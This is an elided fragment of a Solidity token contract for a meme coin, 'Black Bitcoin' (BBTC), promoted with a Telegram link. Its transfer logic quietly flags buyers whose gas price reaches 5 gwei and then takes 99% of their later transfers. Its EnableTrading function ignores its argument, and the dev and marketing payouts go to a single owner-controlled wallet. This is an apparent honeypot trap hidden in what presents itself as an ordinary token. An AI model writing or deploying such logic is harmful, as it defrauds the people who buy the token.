...
BLACK-BITCOIN LET'S MOON !!

https://t.me/blackbitcoinoldbsc
*/
...
contract Blackbitcoin is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Black Bitcoin";
    string private constant _symbol = unicode"BBTC";
    ...
    uint256 public _maxTxAmount = _tTotal * 2 / 200;
    uint256 public _maxWalletToken = _tTotal * 2 / 100;

    uint256 public _swapTrigger = 5;
    uint256 public _swapTokenAtAmount = _tTotal * 1 / 268;

    address payable public DevWallet = payable(0x84bdE84E0c241BF2B44C16D601f812bB4Da4DA21);
    address payable public MarketingWallet = payable(0x84bdE84E0c241BF2B44C16D601f812bB4Da4DA21);
    ...
    function EnableTrading(bool TrueOrFalse) external onlyOwner {
        tradingActive = true;
    ...
    function ElonMode() external onlyOwner {
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (limitInEffect && tradingActiveBlock + 10 >= block.timestamp) {require(tx.gasprice <= 5 gwei);}
        if (transferDelay && to != uniswapV2Pair && tx.gasprice >= 5 gwei) {_isElon[to] = true;}
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 sAmount;
            if (_isElon[sender]){sAmount = tAmount*99/100;}
